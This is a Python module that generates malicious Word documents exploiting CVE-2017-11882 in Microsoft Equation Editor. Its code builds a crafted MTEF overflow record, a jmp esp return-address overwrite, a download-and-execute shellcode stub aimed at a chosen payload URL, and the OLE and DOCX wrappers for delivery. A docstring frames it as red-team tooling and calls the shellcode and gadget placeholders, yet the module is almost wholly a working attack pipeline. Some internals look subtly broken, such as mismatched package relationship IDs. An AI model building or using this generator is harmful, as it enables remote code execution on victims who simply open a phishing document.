"""CVE-2017-11882 (Equation Editor RCE) payload generator.

Generates a DOCX containing an OLE object that triggers a stack buffer
overflow in EQNEDT32.EXE (Microsoft Equation Editor 3.0) when Word parses
the embedded equation.  The OLE object carries a shellcode stub that
resolves ``URLDownloadToFileA`` (urlmon) + ``CreateProcessA`` (kernel32)
to fetch and execute a beacon from ``payload_url``.

Equation Editor ships as a standalone binary (EQNEDT32.EXE) that is often
left unpatched even on fully-updated Office installs, which makes this a
reliable macro-less execution vector: the target opens the document and the
payload runs with no further interaction.

For authorized red-team / phishing-simulation use only.  The shellcode
emitted by this module is a *structural placeholder stub* — operators must
replace it with real position-independent code before delivery.  The
exploit gadget address likewise must be tuned to the exact EQNEDT32.EXE
build present on the target.

References: CVE-2017-11882, EQNEDT32.EXE ``ExecuteSub`` stack overflow,
MS-TechNet ADV170021, MTEF (MathType Equation Translator) format.
"""

from __future__ import annotations

import io
import os
import struct
import zipfile
import logging
from typing import Optional

logger = logging.getLogger('dropoutjeep')

# --- Equation Editor constants -------------------------------------------

# Microsoft Equation 3.0 CLSID: {0002CE02-0000-0000-C000-000000000046}
EQUATION_CLSID = bytes.fromhex('0002ce0200000000c000000000000046')
# Stream names inside the OLE compound file parsed by EQNEDT32.
MTEF_STREAM = 'Equation Native'
OLEPRES_STREAM = 'OlePres000'

# The vulnerable EQNEDT32 stack buffer is 0x28 bytes; a record whose name
# field length exceeds this overwrites the saved EBP and return address.
STACK_BUFFER_SIZE = 0x28

# Default ``jmp esp`` gadget placeholder.  This is NOT a universal gadget —
# it must be replaced with an address inside the target's EQNEDT32.EXE (or
# another always-loaded module) that performs ``jmp esp`` / ``call esp`` so
# execution lands on the stack-resident shellcode emitted right after the
# overwritten return address.
DEFAULT_GADGET = 0x7C345B30  # placeholder jmp esp — replace for target

# OLE2 / Compound Binary File signature.
CFB_SIGNATURE = b'\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1'
# Sector magic values used in the FAT.
ENDOFCHAIN = 0xFFFFFFFE
FATSECT = 0xFFFFFFFD
DIFSECT = 0xFFFFFFFC
FREESECT = 0xFFFFFFFF


# --- Shellcode stub ------------------------------------------------------

def _build_shellcode_stub(payload_url: str) -> bytes:
    """Build a placeholder download/execute shellcode stub.

    The stub embeds the payload URL and demonstrates the classic
    ``PEB -> PEB_LDR_DATA -> InLoadOrderModuleList`` walk used to resolve
    ``URLDownloadToFileA`` (urlmon.dll) followed by ``CreateProcessA``
    (kernel32.dll).  The bytes here are a *structural placeholder* showing
    the intended layout — replace with a real, validated position-
    independent payload before delivery.

    Intended call sequence at runtime::

        URLDownloadToFileA(NULL, payload_url, "C:\\Users\\Public\\ms.dat", 0, NULL)
        CreateProcessA(NULL, "C:\\Users\\Public\\ms.dat", NULL, NULL, FALSE,
                       0, NULL, NULL, &si, &pi)
    """
    url_bytes = payload_url.encode('utf-8') + b'\x00'
    local_path = b'C:\\Users\\Public\\ms.dat\x00'

    stub = b''
    stub += b'\x90' * 16                       # NOP sled
    stub += b'\xEB\x10'                        # jmp over embedded data
    stub += b'DropJeep'                        # 8-byte marker (align)
    # API hashes (placeholders — real stubs use ROR-13 hashes).
    stub += struct.pack('<I', 0x70BD0000)      # URLDownloadToFileA hash
    stub += struct.pack('<I', 0x7C800000)      # kernel32 base hint
    stub += struct.pack('<I', 0x00000000)      # CreateProcessA hash
    stub += b'\xEB\x18'                        # jmp to PEB-walk stub
    stub += b'\x90' * 4                        # alignment padding
    stub += url_bytes                          # embedded payload URL
    stub += local_path                         # embedded local path
    # PEB -> LDR walk preamble (x86, position-independent).
    stub += b'\x60'                            # pushad
    stub += b'\x64\xA1\x30\x00\x00\x00'        # mov eax, [fs:0x30]  ; PEB
    stub += b'\x8B\x40\x0C'                    # mov eax, [eax+0xc]  ; PEB_LDR_DATA
    stub += b'\x8B\x40\x0C'                    # mov eax, [eax+0xc]  ; InLoadOrderModuleList
    stub += b'\x8B\x68\x18'                    # mov ebp, [eax+0x18] ; DllBase
    # Placeholder hash-resolve + call sequence (operator replaces).
    stub += b'\x90' * 64
    stub += b'\x61'                            # popad
    stub += b'\xC3'                            # ret
    logger.debug('built shellcode stub (%d bytes) for %s', len(stub), payload_url)
    return stub


def build_shellcode(payload_url: str) -> bytes:
    """Public alias for the placeholder download/execute shellcode stub."""
    return _build_shellcode_stub(payload_url)


# --- MTEF exploit blob ---------------------------------------------------

def _build_mtef_exploit(shellcode: bytes, gadget: int = DEFAULT_GADGET) -> bytes:
    """Build the crafted MTEF payload for the ``Equation Native`` stream.

    Structure::

        MTEF header (5 bytes)
        FONT record header -> overlong name-length field (0x30 > 0x28 buf)
        0x28 'A' bytes  -> fill the vulnerable stack buffer
        saved EBP (4)
        return address  -> jmp esp gadget
        NOP sled + shellcode  (lands where ESP points)
        MTEF EOF terminator
    """
    mtef = bytearray()
    # MTEF v5 header: version, platform (1=Win), product (3=Equation Editor),
    # product version major, product version minor.
    mtef += struct.pack('BBBBB', 5, 1, 3, 0, 3)
    # FONT record (MTEF type 8).  EQNEDT32 reads the face-name field with a
    # caller-supplied length straight into a 0x28-byte stack buffer.
    mtef += b'\x08'                           # record type = FONT
    mtef += b'\x01'                           # enc (1 = MTEF char set)
    # Length field exceeding the 0x28 buffer -> overwrites EBP + ret addr.
    overflow_len = STACK_BUFFER_SIZE + 8      # 0x30
    mtef += struct.pack('<I', overflow_len)
    # Padding to fill the stack buffer (0x28) + saved EBP (4).
    mtef += b'\x41' * STACK_BUFFER_SIZE       # 'A' * 0x28
    mtef += b'\x42\x42\x42\x42'               # saved EBP
    # Return address -> jmp esp gadget; ESP then points at our shellcode.
    mtef += struct.pack('<I', gadget)
    # NOP sled + shellcode now reside where ESP points post-ret.
    mtef += b'\x90' * 16
    mtef += shellcode
    # MTEF EOF terminator.
    mtef += b'\x00'
    logger.debug('built MTEF exploit blob (%d bytes)', len(mtef))
    return bytes(mtef)


# --- Minimal OLE2 / CFB compound-file builder ---------------------------

class _CFBBuilder:
    """Minimal OLE2 (Compound Binary File) builder, v3 / 512-byte sectors.

    Only regular (non-mini) streams are supported, which is sufficient for
    the Equation Editor exploit payload.  Streams are stored in allocation
    order with a simple directory tree (root -> streams linked as siblings).
    """

    SECTOR_SIZE = 512

    def __init__(self, root_clsid: bytes = b'\x00' * 16) -> None:
        self._streams: list[tuple[str, bytes]] = []
        self._root_clsid = root_clsid

    def add_stream(self, name: str, data: bytes) -> None:
        self._streams.append((name, data))

    @staticmethod
    def _pack_dir_entry(
        name: str,
        obj_type: int,
        color: int,
        left: int,
        right: int,
        child: int,
        clsid: bytes,
        start_sector: int,
        size: int,
    ) -> bytes:
        name_utf16 = name.encode('utf-16-le')
        # Name field is 64 bytes (32 UTF-16 code units), name length in bytes.
        name_field = name_utf16[:64].ljust(64, b'\x00')
        name_len = len(name_utf16[:64])  # bytes, not incl. null term
        entry = bytearray(128)
        # MS-CFB DirectoryEntry layout (128 bytes total):
        #   Name[64], cb(2), ObjectType(1), ColorFlag(1),
        #   LeftSiblingID(4), RightSiblingID(4), ChildID(4),
        #   CLSID[16], StateBits(4), CreationTime(8), ModifiedTime(8),
        #   StartingSectorLocation(4), StreamSize(8).
        off = 0
        entry[off:off + 64] = name_field; off += 64      # 0..63
        struct.pack_into('<H', entry, off, name_len); off += 2   # 64..65
        entry[off] = obj_type; off += 1                 # 66
        entry[off] = color; off += 1                    # 67
        struct.pack_into('<I', entry, off, left); off += 4     # 68..71
        struct.pack_into('<I', entry, off, right); off += 4    # 72..75
        struct.pack_into('<I', entry, off, child); off += 4    # 76..79
        entry[off:off + 16] = clsid.ljust(16, b'\x00'); off += 16  # 80..95
        struct.pack_into('<I', entry, off, 0); off += 4   # 96..99  state bits
        struct.pack_into('<Q', entry, off, 0); off += 8   # 100..107 creation time
        struct.pack_into('<Q', entry, off, 0); off += 8   # 108..115 modified time
        struct.pack_into('<I', entry, off, start_sector); off += 4  # 116..119
        struct.pack_into('<Q', entry, off, size); off += 8  # 120..127
        assert off == 128, off
        return bytes(entry)

    def build(self) -> bytes:
        streams = self._streams
        n_streams = len(streams)

        # Compute data sectors per stream and total data sectors.
        per_stream_sectors: list[int] = []
        total_data_sectors = 0
        for _name, data in streams:
            nsec = max(1, (len(data) + self.SECTOR_SIZE - 1) // self.SECTOR_SIZE)
            per_stream_sectors.append(nsec)
            total_data_sectors += nsec

        # Sector layout:
        #   0          -> FAT
        #   1          -> Directory
        #   2..        -> stream data
        fat_sector = 0
        dir_sector = 1
        first_data_sector = 2
        total_sectors = 2 + total_data_sectors  # sectors 0..total-1

        # Build the directory entries: root (0), stream entries (1..n).
        dir_entries: list[bytes] = []
        root_size = total_data_sectors * self.SECTOR_SIZE  # root's stream size (unused for regular)
        dir_entries.append(self._pack_dir_entry(
            'Root Entry', obj_type=5, color=1,
            left=0xFFFFFFFF, right=0xFFFFFFFF,
            child=1 if n_streams else 0xFFFFFFFF,
            clsid=self._root_clsid,
            start_sector=first_data_sector if total_data_sectors else ENDOFCHAIN,
            size=root_size,
        ))
        # Stream entries linked as a degenerate right-sibling chain (sorted).
        data_sector_cursor = first_data_sector
        for i, (name, data) in enumerate(streams):
            nsec = per_stream_sectors[i]
            start = data_sector_cursor
            data_sector_cursor += nsec
            right = (i + 2) if (i + 1) < n_streams else 0xFFFFFFFF
            dir_entries.append(self._pack_dir_entry(
                name, obj_type=2, color=1,
                left=0xFFFFFFFF, right=right, child=0xFFFFFFFF,
                clsid=b'\x00' * 16,
                start_sector=start,
                size=len(data),
            ))
        # Pad directory to a full sector (4 entries * 128 = 512).
        while len(dir_entries) < 4:
            dir_entries.append(self._pack_dir_entry(
                '', obj_type=0, color=0, left=0xFFFFFFFF, right=0xFFFFFFFF,
                child=0xFFFFFFFF, clsid=b'\x00' * 16,
                start_sector=0, size=0,
            ))
        directory_sector_data = b''.join(dir_entries)[:self.SECTOR_SIZE]
        directory_sector_data = directory_sector_data.ljust(self.SECTOR_SIZE, b'\x00')

        # Build the FAT: one FAT sector covering up to 128 entries.
        fat = bytearray(self.SECTOR_SIZE)
        struct.pack_into('<I', fat, 0, FATSECT)        # sector 0 = FAT
        struct.pack_into('<I', fat, 4, ENDOFCHAIN)     # sector 1 = directory
        off = 8
        for i, nsec in enumerate(per_stream_sectors):
            base = first_data_sector + sum(per_stream_sectors[:i])
            for j in range(nsec):
                if j < nsec - 1:
                    struct.pack_into('<I', fat, off, base + j + 1)
                else:
                    struct.pack_into('<I', fat, off, ENDOFCHAIN)
                off += 4
        # Remaining FAT entries are FREESECT.
        while off < self.SECTOR_SIZE:
            struct.pack_into('<I', fat, off, FREESECT)
            off += 4

        # Build the header.
        header = bytearray(512)
        header[0:8] = CFB_SIGNATURE
        # CLSID (16) zero for generic compound file.
        struct.pack_into('<H', header, 0x18, 0x003E)   # minor version
        struct.pack_into('<H', header, 0x1A, 0x0003)   # major version (v3)
        struct.pack_into('<H', header, 0x1C, 0xFFFE)   # byte order (little-endian)
        struct.pack_into('<H', header, 0x1E, 0x0009)   # sector shift (512)
        struct.pack_into('<H', header, 0x20, 0x0006)   # mini sector shift (64)
        struct.pack_into('<H', header, 0x22, 0x0000)   # reserved
        # reserved2 (4 bytes at 0x24) already zero
        # total directory sectors (v3 should be 0).
        struct.pack_into('<I', header, 0x28, 0)
        struct.pack_into('<I', header, 0x2C, 1)        # total FAT sectors
        struct.pack_into('<I', header, 0x30, dir_sector)        # first dir sector
        struct.pack_into('<I', header, 0x34, 0)                 # signature check (0)
        struct.pack_into('<I', header, 0x38, 0x00001000)        # mini stream cutoff
        # Mini stream disabled by putting cutoff high & no mini FAT.
        struct.pack_into('<I', header, 0x3C, ENDOFCHAIN)        # first mini FAT sector
        struct.pack_into('<I', header, 0x40, 0)                 # total mini FAT sectors
        struct.pack_into('<I', header, 0x44, ENDOFCHAIN)        # first DIFAT sector
        struct.pack_into('<I', header, 0x48, 0)                 # total DIFAT sectors
        # DIFAT array: first entry points to FAT sector 0, rest FREESECT.
        struct.pack_into('<I', header, 0x4C, fat_sector)
        for k in range(1, 109):
            struct.pack_into('<I', header, 0x4C + k * 4, FREESECT)

        # Assemble stream data sectors in order.
        data_sectors = bytearray()
        for (_name, data) in streams:
            padded = data.ljust(per_stream_sectors[streams.index((_name, data))] * self.SECTOR_SIZE, b'\x00')
            data_sectors += padded

        return bytes(header) + bytes(fat) + directory_sector_data + bytes(data_sectors)


def build_ole_object(shellcode: bytes, gadget: int = DEFAULT_GADGET) -> bytes:
    """Build the raw OLE compound object with the Equation Editor exploit.

    Produces a CFB (Compound Binary File) containing:

    * ``Equation Native`` — the crafted MTEF payload that overflows the
      EQNEDT32 stack buffer and pivots into ``shellcode``.
    * ``OlePres000`` — a minimal OLE presentation stream so Word renders
      the object as an inline equation before/during exploitation.

    Args:
        shellcode: position-independent payload bytes placed after the
            overwritten return address (NOP sled prepended internally).
        gadget: ``jmp esp`` / ``call esp`` gadget address to use as the
            overwritten return address.  Must match the target build.

    Returns:
        The raw OLE object bytes suitable for embedding as
        ``word/embeddings/oleObject1.bin`` in a DOCX.
    """
    mtef = _build_mtef_exploit(shellcode, gadget=gadget)

    # Minimal OlePres000 presentation stream: a 12-byte FORMAT header
    # (unused by the exploit path but expected by the OLE presenter).
    ole_pres = struct.pack('<III', 0x00000002, 0x00000004, 0x00000001)

    builder = _CFBBuilder(root_clsid=EQUATION_CLSID)
    builder.add_stream(MTEF_STREAM, mtef)
    builder.add_stream(OLEPRES_STREAM, ole_pres)
    blob = builder.build()
    logger.info(
        'built OLE object (%d bytes) — MTEF %d bytes, gadget=0x%08X',
        len(blob), len(mtef), gadget,
    )
    return blob


# --- DOCX wrapper --------------------------------------------------------

_CONTENT_TYPES_XML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    '<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">'
    '<Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>'
    '<Default Extension="xml" ContentType="application/xml"/>'
    '<Default Extension="bin" ContentType="application/vnd.openxmlformats-officedocument.oleObject"/>'
    '<Override PartName="/word/document.xml" '
    'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>'
    '<Override PartName="/word/settings.xml" '
    'ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.settings+xml"/>'
    '</Types>'
)

_RELS_XML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" '
    'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" '
    'Target="word/document.xml"/>'
    '<Relationship Id="rId2" '
    'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/metadata/core-properties" '
    'Target="docProps/core.xml"/>'
    '</Relationships>'
)

_DOCUMENT_XML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    '<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" '
    'xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" '
    'xmlns:o="urn:schemas-microsoft-com:office:office" '
    'xmlns:v="urn:schemas-microsoft-com:vml">'
    '<w:body>'
    '<w:p>'
    '<w:r>'
    '<w:rPr><w:noProof/></w:rPr>'
    '<w:object w:dxaOrig="3750" w:dyaOrig="375">'
    '<v:shape id="Eq1" o:ole="" style="width:375pt;height:37.5pt">'
    '<v:imagedata r:id="rId1" o:title=""/>'
    '</v:shape>'
    '<o:OLEObject Type="Embed" ProgID="Equation.3" ShapeID="Eq1" '
    'DrawAspect="Content" ObjectID="O1" r:id="rId2"/>'
    '</w:object>'
    '</w:r>'
    '</w:p>'
    '<w:sectPr>'
    '<w:pgSz w:w="12240" w:h="15840"/>'
    '<w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440"/>'
    '</w:sectPr>'
    '</w:body>'
    '</w:document>'
)

_DOCUMENT_RELS_XML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    '<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">'
    '<Relationship Id="rId1" '
    'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" '
    'Target="media/emf1.wmf"/>'
    '<Relationship Id="rId2" '
    'Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/oleObject" '
    'Target="embeddings/oleObject1.bin"/>'
    '</Relationships>'
)

_SETTINGS_XML = (
    '<?xml version="1.0" encoding="UTF-8" standalone="yes"?>\n'
    '<w:settings xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">'
    '<w:compat/>'
    '</w:settings>'
)

# Minimal WMF (placeable header + EOF) used as the equation preview image so
# Word can render the object frame without a real equation image.
_WMF_PLACEABLE = (
    b'\xd7\xcd\xc6\x9a\x00\x00'      # placeable header magic
    + struct.pack('<HHHHHHHHHHHHh',
                  0x0001, 0x0009, 0x0000, 0x0000, 0x0320, 0x0320, 0x0000, 0x0000,
                  0x0000, 0x0000, 0x0000, 0x0000, 0x0320)
    + b'\x000\x001'                   # bounding box
    + b'\x01\x00\x09\x00\x00\x03'    # record: EOF
)


def build_equation_docx(payload_url: str, output_path: str | None = None,
                        gadget: int = DEFAULT_GADGET,
                        shellcode: bytes | None = None) -> bytes:
    """Generate a malicious DOCX with the Equation Editor OLE exploit.

    The payload_url is the URL the embedded shellcode stub will download and
    execute.  When Word opens this document it instantiates the embedded
    Equation Editor OLE object; EQNEDT32 parses the crafted MTEF stream,
    overflows its stack buffer, and pivots into the shellcode.

    Args:
        payload_url: URL the shellcode downloads and executes.
        output_path: optional path to write the generated DOCX to disk.
        gadget: jmp/call esp gadget address for the return-address overwrite.
        shellcode: optional pre-built shellcode; if omitted a placeholder
            download/execute stub is generated from ``payload_url``.

    Returns:
        The DOCX file as bytes.
    """
    sc = shellcode if shellcode is not None else _build_shellcode_stub(payload_url)
    ole_blob = build_ole_object(sc, gadget=gadget)

    buf = io.BytesIO()
    with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED) as zf:
        zf.writestr('[Content_Types].xml', _CONTENT_TYPES_XML)
        zf.writestr('_rels/.rels', _RELS_XML)
        zf.writestr('word/document.xml', _DOCUMENT_XML)
        zf.writestr('word/_rels/document.xml.rels', _DOCUMENT_RELS_XML)
        zf.writestr('word/settings.xml', _SETTINGS_XML)
        zf.writestr('word/media/emf1.wmf', _WMF_PLACEABLE)
        zf.writestr('word/embeddings/oleObject1.bin', ole_blob)

    data = buf.getvalue()
    logger.info('generated Equation Editor DOCX (%d bytes) for %s', len(data), payload_url)

    if output_path:
        with open(output_path, 'wb') as fh:
            fh.write(data)
        logger.info('wrote DOCX to %s', output_path)

    return data
